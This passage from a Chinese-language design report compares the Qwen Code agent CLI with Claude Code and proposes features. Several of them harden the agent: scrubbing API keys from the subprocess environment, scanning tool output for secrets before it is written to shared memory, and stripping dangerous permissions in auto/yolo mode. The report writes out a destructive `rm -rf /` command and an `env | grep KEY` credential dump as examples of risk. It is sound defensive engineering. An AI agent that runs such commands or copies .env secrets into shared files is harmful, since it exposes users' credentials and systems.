**Qwen Code 修改方向**：子进程继承完整环境含 API 密钥。改进方向：① 从 env 删除敏感变量（`DASHSCOPE_API_KEY` 等）；② 保留代理变量；③ 可配置清洗列表。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~80 行
- 开发周期：~1 天（1 人）
- 难点：敏感变量列表的完整性——遗漏任何一个都是安全漏洞

**改进前后对比**：
- **改进前**：shell 命令执行 `env | grep KEY` → 输出所有 API 密钥 → 凭证暴露
- **改进后**：子进程环境已清洗 → `env | grep KEY` 无结果 → 敏感凭证不可达

**意义**：子进程继承 API 密钥 = 任何 shell 命令能读取。
**缺失后果**：`env | grep KEY` 暴露所有密钥。
**改进收益**：环境清洗 = 子进程无法获取敏感凭证。

---

<a id="item-34"></a>

### 34. 工具输出密钥扫描（P2）

Agent 读取了项目中的 `.env` 文件，文件内容包含 AWS 密钥和 Stripe API key。随后 Agent 将这些内容写入了 `QWEN.md` 团队记忆文件——密钥泄漏到团队共享位置，所有团队成员都能看到。解决思路是工具结果用 50+ gitleaks 规则扫描——AWS/GitHub/Slack/PEM/Stripe 等模式，正则懒编译。检测到密钥时阻止写入共享记忆。

**Qwen Code 现状**：无工具输出密钥扫描——Agent 读取 `.env` 后可能将密钥写入 QWEN.md 等共享文件。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `services/teamMemorySync/secretScanner.ts` (295行) | 50+ gitleaks 规则 |
| `services/teamMemorySync/teamMemSecretGuard.ts` (44行) | 写入阻断 |

**参考实现**：[Multica](https://github.com/multica-ai/multica)（`server/pkg/redact/`）在 Agent 输出存入数据库和 WebSocket 广播前自动脱敏——覆盖 AWS Key、GitHub Token、PEM 私钥、SSH 密钥等模式，正则匹配 + 替换为 `[REDACTED ...]`。

**Qwen Code 修改方向**：无工具输出密钥扫描。改进方向：① 移植 gitleaks 规则（或参考 Multica 的 `redact` 包）；② 写入文件/记忆前扫描；③ 检测到密钥时警告 + 阻止写入共享位置。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~250 行
- 开发周期：~2 天（1 人）
- 难点：gitleaks 规则移植——需验证每条规则的准确性和误报率

**改进前后对比**：
- **改进前**：Agent 读取 `.env` → 将 AWS 密钥写入 QWEN.md → 密钥泄漏到团队共享文件
- **改进后**：Agent 读取 `.env` → 写入前密钥扫描 → 检测到 AWS 密钥 → 阻止写入 + 警告

**意义**：Agent 读 `.env` 后可能将密钥写入 QWEN.md。
**缺失后果**：密钥泄漏到团队文件。
**改进收益**：密钥扫描 = 阻止密钥写入共享位置。

---

<a id="item-35"></a>

### 35. privilege escalation防护（P2）

你启用了 auto/yolo 模式让 Agent 自动审批所有操作——但这意味着 Agent 可以执行 `python -c "import os; os.system('rm -rf /')"` 这样的任意代码。auto 模式的初衷是减少审批打断，但不应该允许任意代码执行和系统级操作。解决思路是进入自动模式时剥离危险权限规则——代码执行（python/node/ruby/perl）、shell（eval/exec/sudo）、网络（curl/wget/ssh）、云 CLI（aws/gcloud/kubectl）共 60+ 模式。

**Qwen Code 现状**：`yolo` 模式批准所有操作，无危险规则剥离——模型可执行任意脚本和系统命令。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/permissions/dangerousPatterns.ts` (81行) | 60+ 危险模式自动剥离 |

**Qwen Code 修改方向**：`yolo` 模式批准所有操作，无危险规则剥离。改进方向：① 进入 auto/yolo 时剥离危险权限规则；② 被剥离的规则记录日志；③ `--dangerously-allow-all` 强制保留。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~100 行
- 开发周期：~1 天（1 人）
- 难点：危险模式列表的完整性——需覆盖所有已知的代码执行和系统操作方式

**改进前后对比**：
- **改进前**：yolo 模式 + `Bash(python -c "恶意代码")` → 自动批准 → 任意代码执行
- **改进后**：yolo 模式 → 60+ 危险模式被剥离 → `python` 执行仍需手动审批 → 安全边界保持

**意义**：auto 模式应减少审批，但不应允许任意代码执行。
**缺失后果**：yolo + `Bash(python *)` = 模型可执行任意脚本。
**改进收益**：危险规则剥离 = auto 仅批准安全操作。

---

---

<a id="item-36"></a>

### 36. Query TransitionReason 枚举（P2）

**问题**：Agent 的核心循环在每轮结束后决定"是否继续"。但"继续"可能有 6 种完全不同的原因——工具完成、token 截断、上下文压缩、传输重试、Hook 拦截、预算允许。如果不区分原因，日志不可读、测试不精确、调试困难。

**Claude Code 的解决方案**：每次跨轮时携带显式的 `TransitionReason`，区分 6 种转换原因。下一轮根据原因调整行为（如 COMPACTION 触发摘要注入，RETRY 触发退避延迟）。

**Claude Code 源码索引**：

| 文件 | 行号 | 转换原因 |
|------|------|---------|
| `query.ts` | L1092 | `collapse_drain_retry` — 上下文折叠后重试 |
| `query.ts` | L1162 | `reactive_compact_retry` — 响应式压缩后重试 |
| `query.ts` | L1175 | `prompt_too_long` — 上下文溢出 |
| `query.ts` | L1217 | `max_output_tokens_escalate` — 截断后升级 token 限制 |
| `query.ts` | L1302 | `stop_hook_blocking` — Stop Hook 拦截 |

**Qwen Code 现状**：`packages/core/src/core/client.ts` 循环中通过 if-else 隐式判断转换原因，无显式枚举类型。

**Qwen Code 修改方向**：① 新增 `TransitionReason` 枚举（6 种原因）；② 每次跨轮记录原因到 `QueryTransition` 对象；③ 日志输出包含转换原因。

**实现成本评估**：~50 行枚举 + 日志改动，~0.5 天。

**相关文章**：[查询状态转换模型](../tools/claude-code/20-query-transitions.md)

**意义**：核心循环的可观测性——知道"为什么继续"才能调试"为什么不停"。
**缺失后果**：循环不停时只能逐行读代码猜原因。
**改进收益**：日志直接显示 `transition=COMPACTION` → 立即知道是压缩触发的继续。

---

<a id="item-37"></a>

### 37. 工具并发安全分类（P2）

**问题**：模型一次返回 5 个工具调用，哪些可以并行？当前 Qwen Code 仅按工具类型粗暴分类（Agent 工具并行，其他串行）。但 `read_file` 和 `grep` 也可以并行——它们不修改共享状态。

**Claude Code 的解决方案**：`StreamingToolExecutor`（530 行）对每个工具标记并发安全性，分区后批量并发执行。读工具并行，写工具串行，上下文修改器（如改 CWD 的工具）必须单独执行。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `services/tools/StreamingToolExecutor.ts` | 530 行 | 完整并发执行引擎——分区 + 批量 + 进度 + 合并 |
| `query.ts` | L563, L735 | `new StreamingToolExecutor(...)` — 实例化 |
| `Tool.ts` | — | `ToolUseContext` 共享执行环境 |

**Qwen Code 现状**：`packages/core/src/core/coreToolScheduler.ts` 仅 Agent/Task 工具并行（`Promise.all(taskCalls)`），其他全部 `for...await` 串行。

**Qwen Code 修改方向**：① 对每个工具添加 `concurrencySafe: boolean` 属性；② 执行前按安全性分区；③ 安全工具 `Promise.all()` 并行。

**实现成本评估**：~100 行，~1 天。

**相关文章**：[工具执行运行时](../tools/claude-code/21-tool-execution-runtime.md)

**意义**：工具调用延迟是 Agent 执行时间的主要瓶颈。
**缺失后果**：5 个 read_file 串行 = 5 秒；并行 = 1 秒。
**改进收益**：只读工具并行化 → 代码探索阶段速度 3-5x 提升。

---

<a id="item-38"></a>

### 38. 工具执行进度消息（P2）

**问题**：`npm install` 执行 30 秒，用户看到的只是一个 Spinner 在转——不知道进度、不知道卡在哪。

**Claude Code 的解决方案**：长时间工具发射进度事件，UI 显示"正在安装依赖 42/100..."。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `query/stopHooks.ts` | L204, L412 | `type === 'progress' && toolUseID` — 进度消息路由 |
| `tools/AgentTool/agentToolUtils.ts` | L384 | `toolUses: progress.toolUseCount` — Agent 工具进度 |
| `tools/SkillTool/SkillTool.ts` | L239 | `// Report progress for tool uses` — Skill 工具进度 |

**Qwen Code 现状**：工具执行期间仅显示通用 Spinner（"Responding..."）。

**Qwen Code 修改方向**：① 工具执行超过 3 秒时开始发射进度事件；② Shell 工具解析 stdout 提取进度信息（如 npm 的包数量）；③ UI 展示工具名 + 进度。

**实现成本评估**：~80 行，~1 天。

**改进前后对比**：
- **改进前**：`npm install` 30 秒 → 用户只看到 Spinner → 以为卡死
- **改进后**：`npm install` → "Installing packages 42/100..." → 用户知道在进行中

**意义**：用户信心——知道 Agent 在做什么 vs 怀疑 Agent 卡死。
**缺失后果**：用户在长工具执行时按 Ctrl+C 打断——因为不知道还在工作。
**改进收益**：进度消息 = 用户安心等待 = 更少的误打断。

---

<a id="item-39"></a>

### 39. 运行时任务模型（P2）

**问题**：Claude Code 区分两种"任务"——**work-graph task**（持久目标："重构 auth 模块"，有依赖关系）和 **runtime task**（执行槽："后台 npm install 进程 PID 12345"）。如果把两者混在一起，任务面板会混乱——用户看到"重构 auth"和"PID 12345"并列，分不清哪个是目标哪个是执行。

**Claude Code 的解决方案**：`TaskRecord`（work-graph）和 `RuntimeTaskState`（execution slot）分离。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `utils/tasks.ts` | 862 行 | `TaskStatusSchema`、`blockedBy` 依赖、CRUD 操作 |
| `utils/tasks.ts` | L71 | `TaskStatusSchema` — pending/in_progress/completed/cancelled/blocked |
| `utils/tasks.ts` | L85 | `blockedBy: z.array(z.string())` — 依赖关系 |

**Qwen Code 现状**：仅有 `TodoWriteTool`（平面清单），无 work-graph task 也无 runtime task。

**Qwen Code 修改方向**：① 如果实现 trackerTools（改进报告已有），采用 work-graph task 模型；② 后台 Shell 进程采用 runtime task 模型；③ 两者分开展示。

**实现成本评估**：需结合 trackerTools 和后台 Shell 管理一起实现。

**相关文章**：[参考速查](../tools/claude-code/19-reference.md)

**意义**：概念分离 = 代码清晰 + UI 清晰——用户和开发者都不困惑。
**缺失后果**：任务和进程混在一个列表——用户不知道哪些可以"完成"哪些需要"终止"。
**改进收益**：两种任务分离 = 目标追踪 + 执行监控各归其位。

---

<a id="item-40"></a>

### 40. 后台通知 drain-before-call（P2）

**问题**：后台任务（如 `npm install`）完成时，结果被放入通知队列。但如果主循环不在 LLM 调用前排空队列，模型在下一轮推理时看不到后台结果——以为任务还在运行。

**Claude Code 的解决方案**：每次 LLM 调用前，先排空后台通知队列注入对话上下文。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `query.ts` | L1067 | `// drain first (cheap, keeps granular context)` — 排空注释 |
| `query.ts` | L609 | `// context-collapse: its recoverFromOverflow drains` — 恢复排空 |
| `utils/plugins/pluginAutoupdate.ts` | L42-59 | `pendingNotification` 队列 + `callback(pendingNotification)` 排空 |

**Qwen Code 现状**：有后台 Shell 能力（`is_background` 参数），但无通知排空机制——后台任务完成后模型不知道。

**Qwen Code 修改方向**：① 创建 `NotificationQueue`（线程安全）；② 后台任务完成时入队；③ `queryModel()` 前调用 `drain()` 将结果注入 messages。

**实现成本评估**：~50 行，~0.5 天。

**意义**：后台任务的核心价值在于结果能被模型利用——否则不如前台执行。
**缺失后果**：后台 npm install 完成了，但模型还在说"等待安装完成..."。
**改进收益**：drain-before-call = 模型始终看到最新后台状态。

---

<a id="item-41"></a>

### 41. 压缩后身份重注入（P2）

**问题**：长会话经过上下文压缩后，messages 数组可能只剩 2-3 条（压缩摘要 + 最新消息）。此时多 Agent 场景下的 Teammate 会"忘记自己是谁"——不知道自己的名字、角色、团队。

**Claude Code 的解决方案**：当 `messages.length <= 3` 时，在消息开头注入 identity block（Agent 名称 + 角色 + 团队配置）。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `tools/shared/spawnMultiAgent.ts` | L399-403 | `// Build teammate identity CLI args` — 身份参数构建 |
| `tools/shared/spawnMultiAgent.ts` | L606-610 | tmux 后端身份参数 |
| `tools/shared/spawnMultiAgent.ts` | L1012 | `// In-process teammates receive the prompt directly` — InProcess 身份 |

**Qwen Code 现状**：无身份重注入。压缩后 Subagent 可能丢失上下文身份。

**Qwen Code 修改方向**：① 压缩后检查 messages 长度；② 如果 <= 3 条，注入 `{name, role, team}` 身份消息；③ 仅对 Subagent/Teammate 触发（主 Agent 不需要）。

**实现成本评估**：~20 行，~0.5 天。

**意义**：多 Agent 场景下的身份连续性——Agent 不知道自己是谁就无法正确协作。
**缺失后果**：Teammate "Alice" 压缩后变成通用 Agent → 不知道该向谁汇报 → 协作中断。
**改进收益**：身份重注入 = 压缩后 Agent 仍然知道自己的角色和团队。
